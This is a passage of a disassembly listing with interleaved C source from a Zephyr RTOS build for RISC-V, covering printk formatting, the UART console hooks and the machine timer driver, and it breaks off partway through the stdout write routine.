80043ebe:	1a0a0463          	beqz	s4,80044066 <z_vprintk+0x216>
				if (min_width < 0) {
80043ec2:	000b4e63          	bltz	s6,80043ede <z_vprintk+0x8e>
					min_width = 10 * min_width + *fmt - '0';
80043ec6:	002b1793          	slli	a5,s6,0x2
80043eca:	9b3e                	add	s6,s6,a5
80043ecc:	001b1793          	slli	a5,s6,0x1
80043ed0:	953e                	add	a0,a0,a5
80043ed2:	fd050b13          	addi	s6,a0,-48
				if (padding == PAD_NONE) {
80043ed6:	fa0a12e3          	bnez	s4,80043e7a <z_vprintk+0x2a>
					padding = PAD_SPACE_BEFORE;
80043eda:	4a09                	li	s4,2
				goto still_might_format;
80043edc:	bf79                	j	80043e7a <z_vprintk+0x2a>
					min_width = *fmt - '0';
80043ede:	fd050b13          	addi	s6,a0,-48
80043ee2:	bfd5                	j	80043ed6 <z_vprintk+0x86>
				long_ctr++;
80043ee4:	0a85                	addi	s5,s5,1
				goto still_might_format;
80043ee6:	bf51                	j	80043e7a <z_vprintk+0x2a>
				if (long_ctr == 0) {
80043ee8:	020a9163          	bnez	s5,80043f0a <z_vprintk+0xba>
					d = va_arg(ap, int);
80043eec:	47b2                	lw	a5,12(sp)
80043eee:	00478713          	addi	a4,a5,4
80043ef2:	c63a                	sw	a4,12(sp)
80043ef4:	4384                	lw	s1,0(a5)
				if (d < 0) {
80043ef6:	0404c763          	bltz	s1,80043f44 <z_vprintk+0xf4>
				_printk_dec_ulong(out, ctx, d, padding,
80043efa:	875a                	mv	a4,s6
80043efc:	86d2                	mv	a3,s4
80043efe:	8626                	mv	a2,s1
80043f00:	85ca                	mv	a1,s2
80043f02:	854e                	mv	a0,s3
80043f04:	3d9d                	jal	80043d7a <_printk_dec_ulong>
			might_format = 0;
80043f06:	4481                	li	s1,0
				break;
80043f08:	bf8d                	j	80043e7a <z_vprintk+0x2a>
				} else if (long_ctr == 1) {
80043f0a:	4785                	li	a5,1
80043f0c:	02fa8663          	beq	s5,a5,80043f38 <z_vprintk+0xe8>
					long long lld = va_arg(ap, long long);
80043f10:	47b2                	lw	a5,12(sp)
80043f12:	079d                	addi	a5,a5,7
80043f14:	9be1                	andi	a5,a5,-8
80043f16:	00878713          	addi	a4,a5,8
80043f1a:	c63a                	sw	a4,12(sp)
80043f1c:	4384                	lw	s1,0(a5)
80043f1e:	43d8                	lw	a4,4(a5)
					if (lld > INT32_MAX ||
80043f20:	800007b7          	lui	a5,0x80000
80043f24:	97a6                	add	a5,a5,s1
80043f26:	0097b7b3          	sltu	a5,a5,s1
80043f2a:	97ba                	add	a5,a5,a4
80043f2c:	d7e9                	beqz	a5,80043ef6 <z_vprintk+0xa6>
						print_err(out, ctx);
80043f2e:	85ca                	mv	a1,s2
80043f30:	854e                	mv	a0,s3
80043f32:	3339                	jal	80043c40 <print_err>
			might_format = 0;
80043f34:	4481                	li	s1,0
						break;
80043f36:	b791                	j	80043e7a <z_vprintk+0x2a>
					long ld = va_arg(ap, long);
80043f38:	47b2                	lw	a5,12(sp)
80043f3a:	00478713          	addi	a4,a5,4 # 80000004 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80000005>
80043f3e:	c63a                	sw	a4,12(sp)
80043f40:	4384                	lw	s1,0(a5)
					d = (s32_t)ld;
80043f42:	bf55                	j	80043ef6 <z_vprintk+0xa6>
					out((int)'-', ctx);
80043f44:	85ca                	mv	a1,s2
80043f46:	02d00513          	li	a0,45
80043f4a:	9982                	jalr	s3
					d = -d;
80043f4c:	409004b3          	neg	s1,s1
					min_width--;
80043f50:	1b7d                	addi	s6,s6,-1
80043f52:	b765                	j	80043efa <z_vprintk+0xaa>
				if (long_ctr == 0) {
80043f54:	000a9e63          	bnez	s5,80043f70 <z_vprintk+0x120>
					u = va_arg(ap, unsigned int);
80043f58:	47b2                	lw	a5,12(sp)
80043f5a:	00478713          	addi	a4,a5,4
80043f5e:	c63a                	sw	a4,12(sp)
80043f60:	4390                	lw	a2,0(a5)
				_printk_dec_ulong(out, ctx, u, padding,
80043f62:	875a                	mv	a4,s6
80043f64:	86d2                	mv	a3,s4
80043f66:	85ca                	mv	a1,s2
80043f68:	854e                	mv	a0,s3
80043f6a:	3d01                	jal	80043d7a <_printk_dec_ulong>
			might_format = 0;
80043f6c:	4481                	li	s1,0
				break;
80043f6e:	b731                	j	80043e7a <z_vprintk+0x2a>
				} else if (long_ctr == 1) {
80043f70:	4785                	li	a5,1
80043f72:	02fa8363          	beq	s5,a5,80043f98 <z_vprintk+0x148>
					unsigned long long llu =
80043f76:	47b2                	lw	a5,12(sp)
80043f78:	079d                	addi	a5,a5,7
80043f7a:	9be1                	andi	a5,a5,-8
80043f7c:	00878713          	addi	a4,a5,8
80043f80:	c63a                	sw	a4,12(sp)
80043f82:	4390                	lw	a2,0(a5)
80043f84:	43dc                	lw	a5,4(a5)
					if (llu > INT32_MAX) {
80043f86:	e781                	bnez	a5,80043f8e <z_vprintk+0x13e>
80043f88:	ffe9                	bnez	a5,80043f62 <z_vprintk+0x112>
80043f8a:	fc065ce3          	bgez	a2,80043f62 <z_vprintk+0x112>
						print_err(out, ctx);
80043f8e:	85ca                	mv	a1,s2
80043f90:	854e                	mv	a0,s3
80043f92:	317d                	jal	80043c40 <print_err>
			might_format = 0;
80043f94:	4481                	li	s1,0
						break;
80043f96:	b5d5                	j	80043e7a <z_vprintk+0x2a>
					long lu = va_arg(ap, unsigned long);
80043f98:	47b2                	lw	a5,12(sp)
80043f9a:	00478713          	addi	a4,a5,4
80043f9e:	c63a                	sw	a4,12(sp)
80043fa0:	4390                	lw	a2,0(a5)
					u = (u32_t)lu;
80043fa2:	b7c1                	j	80043f62 <z_vprintk+0x112>
				  out('0', ctx);
80043fa4:	85ca                	mv	a1,s2
80043fa6:	03000513          	li	a0,48
80043faa:	9982                	jalr	s3
				  out('x', ctx);
80043fac:	85ca                	mv	a1,s2
80043fae:	07800513          	li	a0,120
80043fb2:	9982                	jalr	s3
				  min_width = 8;
80043fb4:	4b21                	li	s6,8
				  padding = PAD_ZERO_BEFORE;
80043fb6:	4a05                	li	s4,1
				if (long_ctr < 2) {
80043fb8:	4785                	li	a5,1
80043fba:	0357d163          	bge	a5,s5,80043fdc <z_vprintk+0x18c>
					x = va_arg(ap, unsigned long long);
80043fbe:	47b2                	lw	a5,12(sp)
80043fc0:	079d                	addi	a5,a5,7
80043fc2:	9be1                	andi	a5,a5,-8
80043fc4:	00878713          	addi	a4,a5,8
80043fc8:	c63a                	sw	a4,12(sp)
80043fca:	4390                	lw	a2,0(a5)
80043fcc:	43d4                	lw	a3,4(a5)
				_printk_hex_ulong(out, ctx, x, padding,
80043fce:	87da                	mv	a5,s6
80043fd0:	8752                	mv	a4,s4
80043fd2:	85ca                	mv	a1,s2
80043fd4:	854e                	mv	a0,s3
80043fd6:	3945                	jal	80043c86 <_printk_hex_ulong>
			might_format = 0;
80043fd8:	4481                	li	s1,0
				break;
80043fda:	b545                	j	80043e7a <z_vprintk+0x2a>
					x = va_arg(ap, unsigned long);
80043fdc:	47b2                	lw	a5,12(sp)
80043fde:	00478713          	addi	a4,a5,4
80043fe2:	c63a                	sw	a4,12(sp)
80043fe4:	4390                	lw	a2,0(a5)
80043fe6:	4681                	li	a3,0
80043fe8:	b7dd                	j	80043fce <z_vprintk+0x17e>
				char *s = va_arg(ap, char *);
80043fea:	47b2                	lw	a5,12(sp)
80043fec:	00478713          	addi	a4,a5,4
80043ff0:	c63a                	sw	a4,12(sp)
80043ff2:	0007ab83          	lw	s7,0(a5)
80043ff6:	84de                	mv	s1,s7
				while (*s)
80043ff8:	a021                	j	80044000 <z_vprintk+0x1b0>
					out((int)(*s++), ctx);
80043ffa:	0485                	addi	s1,s1,1
80043ffc:	85ca                	mv	a1,s2
80043ffe:	9982                	jalr	s3
				while (*s)
80044000:	0004c503          	lbu	a0,0(s1)
80044004:	f97d                	bnez	a0,80043ffa <z_vprintk+0x1aa>
				if (padding == PAD_SPACE_AFTER) {
80044006:	478d                	li	a5,3
80044008:	00fa0463          	beq	s4,a5,80044010 <z_vprintk+0x1c0>
			might_format = 0;
8004400c:	4481                	li	s1,0
8004400e:	b5b5                	j	80043e7a <z_vprintk+0x2a>
					int remaining = min_width - (s - start);
80044010:	417487b3          	sub	a5,s1,s7
80044014:	40fb07b3          	sub	a5,s6,a5
					while (remaining-- > 0) {
80044018:	a031                	j	80044024 <z_vprintk+0x1d4>
						out(' ', ctx);
8004401a:	85ca                	mv	a1,s2
8004401c:	02000513          	li	a0,32
80044020:	9982                	jalr	s3
					while (remaining-- > 0) {
80044022:	87a6                	mv	a5,s1
80044024:	fff78493          	addi	s1,a5,-1
80044028:	fef049e3          	bgtz	a5,8004401a <z_vprintk+0x1ca>
			might_format = 0;
8004402c:	4481                	li	s1,0
8004402e:	b5b1                	j	80043e7a <z_vprintk+0x2a>
				int c = va_arg(ap, int);
80044030:	47b2                	lw	a5,12(sp)
80044032:	00478713          	addi	a4,a5,4
80044036:	c63a                	sw	a4,12(sp)
				out(c, ctx);
80044038:	85ca                	mv	a1,s2
8004403a:	4388                	lw	a0,0(a5)
8004403c:	9982                	jalr	s3
			might_format = 0;
8004403e:	4481                	li	s1,0
				break;
80044040:	bd2d                	j	80043e7a <z_vprintk+0x2a>
				out((int)'%', ctx);
80044042:	85ca                	mv	a1,s2
80044044:	02500513          	li	a0,37
80044048:	9982                	jalr	s3
			might_format = 0;
8004404a:	4481                	li	s1,0
				break;
8004404c:	b53d                	j	80043e7a <z_vprintk+0x2a>
				out((int)'%', ctx);
8004404e:	85ca                	mv	a1,s2
80044050:	02500513          	li	a0,37
80044054:	9982                	jalr	s3
				out((int)*fmt, ctx);
80044056:	85ca                	mv	a1,s2
80044058:	00044503          	lbu	a0,0(s0)
8004405c:	9982                	jalr	s3
			might_format = 0;
8004405e:	4481                	li	s1,0
				break;
80044060:	bd29                	j	80043e7a <z_vprintk+0x2a>
				padding = PAD_SPACE_AFTER;
80044062:	4a0d                	li	s4,3
80044064:	bd19                	j	80043e7a <z_vprintk+0x2a>
					padding = PAD_ZERO_BEFORE;
80044066:	4a05                	li	s4,1
80044068:	bd09                	j	80043e7a <z_vprintk+0x2a>
}
8004406a:	50f2                	lw	ra,60(sp)
8004406c:	5462                	lw	s0,56(sp)
8004406e:	54d2                	lw	s1,52(sp)
80044070:	5942                	lw	s2,48(sp)
80044072:	59b2                	lw	s3,44(sp)
80044074:	5a22                	lw	s4,40(sp)
80044076:	5a92                	lw	s5,36(sp)
80044078:	5b02                	lw	s6,32(sp)
8004407a:	4bf2                	lw	s7,28(sp)
8004407c:	6121                	addi	sp,sp,64
8004407e:	8082                	ret

80044080 <vprintk>:
{
80044080:	1101                	addi	sp,sp,-32
80044082:	ce06                	sw	ra,28(sp)
	struct out_context ctx = { 0 };
80044084:	c602                	sw	zero,12(sp)
	z_vprintk(char_out, &ctx, fmt, ap);
80044086:	86ae                	mv	a3,a1
80044088:	862a                	mv	a2,a0
8004408a:	006c                	addi	a1,sp,12
8004408c:	80044537          	lui	a0,0x80044
80044090:	c6c50513          	addi	a0,a0,-916 # 80043c6c <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80043c6d>
80044094:	3b75                	jal	80043e50 <z_vprintk>
}
80044096:	40f2                	lw	ra,28(sp)
80044098:	6105                	addi	sp,sp,32
8004409a:	8082                	ret

8004409c <printk>:
{
8004409c:	7139                	addi	sp,sp,-64
8004409e:	ce06                	sw	ra,28(sp)
800440a0:	d22e                	sw	a1,36(sp)
800440a2:	d432                	sw	a2,40(sp)
800440a4:	d636                	sw	a3,44(sp)
800440a6:	d83a                	sw	a4,48(sp)
800440a8:	da3e                	sw	a5,52(sp)
800440aa:	dc42                	sw	a6,56(sp)
800440ac:	de46                	sw	a7,60(sp)
	va_start(ap, fmt);
800440ae:	104c                	addi	a1,sp,36
800440b0:	c62e                	sw	a1,12(sp)
		vprintk(fmt, ap);
800440b2:	37f9                	jal	80044080 <vprintk>
}
800440b4:	40f2                	lw	ra,28(sp)
800440b6:	6121                	addi	sp,sp,64
800440b8:	8082                	ret

800440ba <_ConfigAbsSyms>:
GEN_ABSOLUTE_SYM(CONFIG_KERNEL_BIN_NAME, 1);
GEN_ABSOLUTE_SYM(CONFIG_OUTPUT_STAT, 1);
GEN_ABSOLUTE_SYM(CONFIG_OUTPUT_DISASSEMBLY, 1);
GEN_ABSOLUTE_SYM(CONFIG_OUTPUT_PRINT_MEMORY_USAGE, 1);

GEN_ABS_SYM_END
800440ba:	8082                	ret

800440bc <k_cpu_idle>:
 */
static ALWAYS_INLINE void z_arch_irq_unlock(unsigned int key)
{
	unsigned int mstatus;

	__asm__ volatile ("csrrs %0, mstatus, %1"
800440bc:	47a1                	li	a5,8
800440be:	3007a7f3          	csrrs	a5,mstatus,a5
	z_sys_trace_idle();
	/* unlock interrupts */
	irq_unlock(key);

	/* Wait for interrupt */
	__asm__ volatile("wfi");
800440c2:	10500073          	wfi
 * @return N/A
 */
void k_cpu_idle(void)
{
	riscv_idle(SOC_MSTATUS_IEN);
}
800440c6:	8082                	ret

800440c8 <z_arch_irq_enable>:
	 * CSR mie register is updated using atomic instruction csrrs
	 * (atomic read and set bits in CSR register)
	 */
	__asm__ volatile ("csrrs %0, mie, %1\n"
			  : "=r" (mie)
			  : "r" (1 << irq));
800440c8:	4785                	li	a5,1
800440ca:	00a79533          	sll	a0,a5,a0
	__asm__ volatile ("csrrs %0, mie, %1\n"
800440ce:	30452573          	csrrs	a0,mie,a0
}
800440d2:	8082                	ret

800440d4 <soc_interrupt_init>:
	__asm__ volatile ("csrrc %0, mstatus, %1"
800440d4:	47a1                	li	a5,8
800440d6:	3007b7f3          	csrrc	a5,mstatus,a5
void soc_interrupt_init(void)
{
	/* ensure that all interrupts are disabled */
	(void)irq_lock();

	__asm__ volatile ("csrwi mie, 0\n"
800440da:	30405073          	csrwi	mie,0
800440de:	34405073          	csrwi	mip,0
			  "csrwi mip, 0\n");
}
800440e2:	8082                	ret

800440e4 <console_out>:
 *
 * @return The character passed as input.
 */

static int console_out(int c)
{
800440e4:	1141                	addi	sp,sp,-16
800440e6:	c606                	sw	ra,12(sp)
800440e8:	c422                	sw	s0,8(sp)
800440ea:	842a                	mv	s0,a0
		return c;
	}

#endif  /* CONFIG_UART_CONSOLE_DEBUG_SERVER_HOOKS */

	if ('\n' == c) {
800440ec:	47a9                	li	a5,10
800440ee:	02f50063          	beq	a0,a5,8004410e <console_out+0x2a>
		uart_poll_out(uart_console_dev, '\r');
	}
	uart_poll_out(uart_console_dev, c);
800440f2:	800477b7          	lui	a5,0x80047
800440f6:	db87a503          	lw	a0,-584(a5) # 80046db8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046db9>
				      unsigned char out_char);

static inline void z_impl_uart_poll_out(struct device *dev,
						unsigned char out_char)
{
	const struct uart_driver_api *api =
800440fa:	415c                	lw	a5,4(a0)
		(const struct uart_driver_api *)dev->driver_api;

	api->poll_out(dev, out_char);
800440fc:	43dc                	lw	a5,4(a5)
800440fe:	0ff47593          	andi	a1,s0,255
80044102:	9782                	jalr	a5

	return c;
}
80044104:	8522                	mv	a0,s0
80044106:	40b2                	lw	ra,12(sp)
80044108:	4422                	lw	s0,8(sp)
8004410a:	0141                	addi	sp,sp,16
8004410c:	8082                	ret
		uart_poll_out(uart_console_dev, '\r');
8004410e:	800477b7          	lui	a5,0x80047
80044112:	db87a503          	lw	a0,-584(a5) # 80046db8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046db9>
	const struct uart_driver_api *api =
80044116:	415c                	lw	a5,4(a0)
	api->poll_out(dev, out_char);
80044118:	43dc                	lw	a5,4(a5)
8004411a:	45b5                	li	a1,13
8004411c:	9782                	jalr	a5
8004411e:	bfd1                	j	800440f2 <console_out+0xe>

80044120 <uart_console_hook_install>:
 *
 * @return N/A
 */

void uart_console_hook_install(void)
{
80044120:	1141                	addi	sp,sp,-16
80044122:	c606                	sw	ra,12(sp)
80044124:	c422                	sw	s0,8(sp)
	__stdout_hook_install(console_out);
80044126:	80044437          	lui	s0,0x80044
8004412a:	0e440513          	addi	a0,s0,228 # 800440e4 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x800440e5>
8004412e:	227d                	jal	800442dc <__stdout_hook_install>
	__printk_hook_install(console_out);
80044130:	0e440513          	addi	a0,s0,228
80044134:	3b09                	jal	80043e46 <__printk_hook_install>
}
80044136:	40b2                	lw	ra,12(sp)
80044138:	4422                	lw	s0,8(sp)
8004413a:	0141                	addi	sp,sp,16
8004413c:	8082                	ret

8004413e <uart_console_init>:
 * @brief Initialize one UART as the console/debug port
 *
 * @return 0 if successful, otherwise failed.
 */
static int uart_console_init(struct device *arg)
{
8004413e:	1141                	addi	sp,sp,-16
80044140:	c606                	sw	ra,12(sp)

#ifdef __cplusplus
extern "C" {
#endif

K_SYSCALL_DECLARE1(K_SYSCALL_DEVICE_GET_BINDING, device_get_binding, struct device *, const char *, name)
80044142:	80046537          	lui	a0,0x80046
80044146:	38850513          	addi	a0,a0,904 # 80046388 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046389>
8004414a:	24e1                	jal	80044412 <z_impl_device_get_binding>

	ARG_UNUSED(arg);

	uart_console_dev = device_get_binding(CONFIG_UART_CONSOLE_ON_DEV_NAME);
8004414c:	800477b7          	lui	a5,0x80047
80044150:	daa7ac23          	sw	a0,-584(a5) # 80046db8 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046db9>
		}
	}
	k_busy_wait(1000000);
#endif

	uart_console_hook_install();
80044154:	37f1                	jal	80044120 <uart_console_hook_install>

	return 0;
}
80044156:	4501                	li	a0,0
80044158:	40b2                	lw	ra,12(sp)
8004415a:	0141                	addi	sp,sp,16
8004415c:	8082                	ret

8004415e <set_mtimecmp>:
	 * but are NOT internally latched for multiword transfers.  So
	 * we have to be careful about sequencing to avoid triggering
	 * spurious interrupts: always set the high word to a max
	 * value first.
	 */
	r[1] = 0xffffffff;
8004415e:	200007b7          	lui	a5,0x20000
80044162:	577d                	li	a4,-1
80044164:	c7d8                	sw	a4,12(a5)
	r[0] = (u32_t)time;
80044166:	c788                	sw	a0,8(a5)
	r[1] = (u32_t)(time >> 32);
80044168:	c7cc                	sw	a1,12(a5)
}
8004416a:	8082                	ret

8004416c <mtime>:
	volatile u32_t *r = (u32_t *)RISCV_MTIME_BASE;
	u32_t lo, hi;

	/* Likewise, must guard against rollover when reading */
	do {
		hi = r[1];
8004416c:	200007b7          	lui	a5,0x20000
80044170:	43cc                	lw	a1,4(a5)
		lo = r[0];
80044172:	4388                	lw	a0,0(a5)
	} while (r[1] != hi);
80044174:	43dc                	lw	a5,4(a5)
80044176:	feb79be3          	bne	a5,a1,8004416c <mtime>

	return (((u64_t)hi) << 32) | lo;
}
8004417a:	8082                	ret

8004417c <timer_isr>:

static void timer_isr(void *arg)
{
8004417c:	1101                	addi	sp,sp,-32
8004417e:	ce06                	sw	ra,28(sp)
80044180:	cc22                	sw	s0,24(sp)
80044182:	ca26                	sw	s1,20(sp)
80044184:	c84a                	sw	s2,16(sp)
80044186:	c64e                	sw	s3,12(sp)
80044188:	44a1                	li	s1,8
8004418a:	3004b4f3          	csrrc	s1,mstatus,s1
	key = (mstatus & SOC_MSTATUS_IEN);
8004418e:	88a1                	andi	s1,s1,8
	ARG_UNUSED(arg);

	k_spinlock_key_t key = k_spin_lock(&lock);
	u64_t now = mtime();
80044190:	3ff1                	jal	8004416c <mtime>
	u32_t dticks = (u32_t)((now - last_count) / CYC_PER_TICK);
80044192:	80047937          	lui	s2,0x80047
80044196:	d9090913          	addi	s2,s2,-624 # 80046d90 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d91>
8004419a:	00092403          	lw	s0,0(s2)
8004419e:	00492983          	lw	s3,4(s2)
800441a2:	40850733          	sub	a4,a0,s0
800441a6:	00e537b3          	sltu	a5,a0,a4
800441aa:	413586b3          	sub	a3,a1,s3
800441ae:	40f685b3          	sub	a1,a3,a5
800441b2:	6605                	lui	a2,0x1
800441b4:	38860613          	addi	a2,a2,904 # 1388 <CONFIG_ISR_STACK_SIZE+0x388>
800441b8:	4681                	li	a3,0
800441ba:	853a                	mv	a0,a4
800441bc:	85cfc0ef          	jal	ra,80040218 <__udivdi3>

	last_count += dticks * CYC_PER_TICK;
800441c0:	6785                	lui	a5,0x1
800441c2:	38878793          	addi	a5,a5,904 # 1388 <CONFIG_ISR_STACK_SIZE+0x388>
800441c6:	02a787b3          	mul	a5,a5,a0
800441ca:	97a2                	add	a5,a5,s0
800441cc:	0087b433          	sltu	s0,a5,s0
800441d0:	944e                	add	s0,s0,s3
800441d2:	00f92023          	sw	a5,0(s2)
800441d6:	00892223          	sw	s0,4(s2)
	__asm__ volatile ("csrrs %0, mstatus, %1"
800441da:	3004a4f3          	csrrs	s1,mstatus,s1
		}
		set_mtimecmp(next);
	}

	k_spin_unlock(&lock, key);
	z_clock_announce(IS_ENABLED(CONFIG_TICKLESS_KERNEL) ? dticks : 1);
800441de:	581000ef          	jal	ra,80044f5e <z_clock_announce>
}
800441e2:	40f2                	lw	ra,28(sp)
800441e4:	4462                	lw	s0,24(sp)
800441e6:	44d2                	lw	s1,20(sp)
800441e8:	4942                	lw	s2,16(sp)
800441ea:	49b2                	lw	s3,12(sp)
800441ec:	6105                	addi	sp,sp,32
800441ee:	8082                	ret

800441f0 <z_clock_driver_init>:

int z_clock_driver_init(struct device *device)
{
800441f0:	1141                	addi	sp,sp,-16
800441f2:	c606                	sw	ra,12(sp)
	IRQ_CONNECT(RISCV_MACHINE_TIMER_IRQ, 0, timer_isr, NULL, 0);
	set_mtimecmp(mtime() + CYC_PER_TICK);
800441f4:	3fa5                	jal	8004416c <mtime>
800441f6:	6785                	lui	a5,0x1
800441f8:	38878793          	addi	a5,a5,904 # 1388 <CONFIG_ISR_STACK_SIZE+0x388>
800441fc:	97aa                	add	a5,a5,a0
800441fe:	00a7b733          	sltu	a4,a5,a0
80044202:	853e                	mv	a0,a5
80044204:	95ba                	add	a1,a1,a4
80044206:	3fa1                	jal	8004415e <set_mtimecmp>
	irq_enable(RISCV_MACHINE_TIMER_IRQ);
80044208:	451d                	li	a0,7
8004420a:	3d7d                	jal	800440c8 <z_arch_irq_enable>
	return 0;
}
8004420c:	4501                	li	a0,0
8004420e:	40b2                	lw	ra,12(sp)
80044210:	0141                	addi	sp,sp,16
80044212:	8082                	ret

80044214 <z_clock_set_timeout>:
	 * logic below to reset the comparator, we'll always bump it
	 * forward to the "next tick" due to MIN_DELAY handling and
	 * the interrupt will never fire!  Just rely on the fact that
	 * the OS gave us the proper timeout already.
	 */
	if (idle) {
80044214:	e9c9                	bnez	a1,800442a6 <z_clock_set_timeout+0x92>
{
80044216:	1141                	addi	sp,sp,-16
80044218:	c606                	sw	ra,12(sp)
8004421a:	c422                	sw	s0,8(sp)
8004421c:	c226                	sw	s1,4(sp)
		return;
	}

	ticks = ticks == K_FOREVER ? MAX_TICKS : ticks;
8004421e:	57fd                	li	a5,-1
80044220:	00f50e63          	beq	a0,a5,8004423c <z_clock_set_timeout+0x28>
	ticks = MAX(MIN(ticks - 1, (s32_t)MAX_TICKS), 0);
80044224:	fff50413          	addi	s0,a0,-1
80044228:	00805f63          	blez	s0,80044246 <z_clock_set_timeout+0x32>
8004422c:	000d27b7          	lui	a5,0xd2
80044230:	b7078793          	addi	a5,a5,-1168 # d1b70 <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0x57a50>
80044234:	0087da63          	bge	a5,s0,80044248 <z_clock_set_timeout+0x34>
80044238:	843e                	mv	s0,a5
8004423a:	a039                	j	80044248 <z_clock_set_timeout+0x34>
	ticks = ticks == K_FOREVER ? MAX_TICKS : ticks;
8004423c:	000d2537          	lui	a0,0xd2
80044240:	b7050513          	addi	a0,a0,-1168 # d1b70 <CONFIG_SYS_CLOCK_HW_CYCLES_PER_SEC+0x57a50>
80044244:	b7c5                	j	80044224 <z_clock_set_timeout+0x10>
	ticks = MAX(MIN(ticks - 1, (s32_t)MAX_TICKS), 0);
80044246:	4401                	li	s0,0
	__asm__ volatile ("csrrc %0, mstatus, %1"
80044248:	44a1                	li	s1,8
8004424a:	3004b4f3          	csrrc	s1,mstatus,s1
	key = (mstatus & SOC_MSTATUS_IEN);
8004424e:	88a1                	andi	s1,s1,8

	k_spinlock_key_t key = k_spin_lock(&lock);
	u64_t now = mtime();
80044250:	3f31                	jal	8004416c <mtime>
	u32_t cyc = ticks * CYC_PER_TICK;
80044252:	6685                	lui	a3,0x1
80044254:	38868813          	addi	a6,a3,904 # 1388 <CONFIG_ISR_STACK_SIZE+0x388>
80044258:	03040433          	mul	s0,s0,a6

	/* Round up to next tick boundary.  Note use of 32 bit math,
	 * max_ticks is calibrated to permit this.
	 */
	cyc += (u32_t)(now - last_count) + (CYC_PER_TICK - 1);
8004425c:	80047637          	lui	a2,0x80047
80044260:	d9060613          	addi	a2,a2,-624 # 80046d90 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d91>
80044264:	4218                	lw	a4,0(a2)
80044266:	424c                	lw	a1,4(a2)
80044268:	40e507b3          	sub	a5,a0,a4
8004426c:	97a2                	add	a5,a5,s0
8004426e:	38768693          	addi	a3,a3,903
80044272:	97b6                	add	a5,a5,a3
	cyc = (cyc / CYC_PER_TICK) * CYC_PER_TICK;
80044274:	0307d7b3          	divu	a5,a5,a6
80044278:	030787b3          	mul	a5,a5,a6

	if ((s32_t)(cyc + last_count - now) < MIN_DELAY) {
8004427c:	00f706b3          	add	a3,a4,a5
80044280:	8e89                	sub	a3,a3,a0
80044282:	3e700613          	li	a2,999
80044286:	00d64363          	blt	a2,a3,8004428c <z_clock_set_timeout+0x78>
		cyc += CYC_PER_TICK;
8004428a:	97c2                	add	a5,a5,a6
	}

	set_mtimecmp(cyc + last_count);
8004428c:	00e78533          	add	a0,a5,a4
80044290:	00f537b3          	sltu	a5,a0,a5
80044294:	95be                	add	a1,a1,a5
80044296:	35e1                	jal	8004415e <set_mtimecmp>
	__asm__ volatile ("csrrs %0, mstatus, %1"
80044298:	3004a4f3          	csrrs	s1,mstatus,s1
	k_spin_unlock(&lock, key);
#endif
}
8004429c:	40b2                	lw	ra,12(sp)
8004429e:	4422                	lw	s0,8(sp)
800442a0:	4492                	lw	s1,4(sp)
800442a2:	0141                	addi	sp,sp,16
800442a4:	8082                	ret
800442a6:	8082                	ret

800442a8 <z_clock_elapsed>:

u32_t z_clock_elapsed(void)
{
800442a8:	1141                	addi	sp,sp,-16
800442aa:	c606                	sw	ra,12(sp)
800442ac:	c422                	sw	s0,8(sp)
	__asm__ volatile ("csrrc %0, mstatus, %1"
800442ae:	4421                	li	s0,8
800442b0:	30043473          	csrrc	s0,mstatus,s0
	key = (mstatus & SOC_MSTATUS_IEN);
800442b4:	8821                	andi	s0,s0,8
	if (!IS_ENABLED(CONFIG_TICKLESS_KERNEL)) {
		return 0;
	}

	k_spinlock_key_t key = k_spin_lock(&lock);
	u32_t ret = ((u32_t)mtime() - (u32_t)last_count) / CYC_PER_TICK;
800442b6:	3d5d                	jal	8004416c <mtime>
800442b8:	800477b7          	lui	a5,0x80047
800442bc:	d907a783          	lw	a5,-624(a5) # 80046d90 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d91>
800442c0:	8d1d                	sub	a0,a0,a5
800442c2:	6785                	lui	a5,0x1
800442c4:	38878793          	addi	a5,a5,904 # 1388 <CONFIG_ISR_STACK_SIZE+0x388>
800442c8:	02f55533          	divu	a0,a0,a5
	__asm__ volatile ("csrrs %0, mstatus, %1"
800442cc:	30042473          	csrrs	s0,mstatus,s0

	k_spin_unlock(&lock, key);
	return ret;
}
800442d0:	40b2                	lw	ra,12(sp)
800442d2:	4422                	lw	s0,8(sp)
800442d4:	0141                	addi	sp,sp,16
800442d6:	8082                	ret

800442d8 <_stdout_hook_default>:
static int _stdout_hook_default(int c)
{
	(void)(c);  /* Prevent warning about unused argument */

	return EOF;
}
800442d8:	557d                	li	a0,-1
800442da:	8082                	ret

800442dc <__stdout_hook_install>:

static int (*_stdout_hook)(int) = _stdout_hook_default;

void __stdout_hook_install(int (*hook)(int))
{
	_stdout_hook = hook;
800442dc:	800477b7          	lui	a5,0x80047
800442e0:	d2a7a223          	sw	a0,-732(a5) # 80046d24 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d25>
}
800442e4:	8082                	ret

800442e6 <z_impl_zephyr_write_stdout>:
	return z_impl_zephyr_read_stdin((char *)buf, nbytes);
}
#endif

int z_impl_zephyr_write_stdout(const void *buffer, int nbytes)
{
800442e6:	1101                	addi	sp,sp,-32
800442e8:	ce06                	sw	ra,28(sp)
800442ea:	cc22                	sw	s0,24(sp)
800442ec:	ca26                	sw	s1,20(sp)
800442ee:	c84a                	sw	s2,16(sp)
800442f0:	c64e                	sw	s3,12(sp)
800442f2:	89aa                	mv	s3,a0
800442f4:	892e                	mv	s2,a1
	const char *buf = buffer;
	int i;

	for (i = 0; i < nbytes; i++) {
800442f6:	4401                	li	s0,0
800442f8:	a809                	j	8004430a <z_impl_zephyr_write_stdout+0x24>
		if (*(buf + i) == '\n') {
			_stdout_hook('\r');
		}
		_stdout_hook(*(buf + i));
800442fa:	800477b7          	lui	a5,0x80047
800442fe:	d247a783          	lw	a5,-732(a5) # 80046d24 <CONFIG_OFFLOAD_WORKQUEUE_PRIORITY+0x80046d25>
80044302:	0004c503          	lbu	a0,0(s1)
80044306:	9782                	jalr	a5
	for (i = 0; i < nbytes; i++) {
80044308:	0405                	addi	s0,s0,1
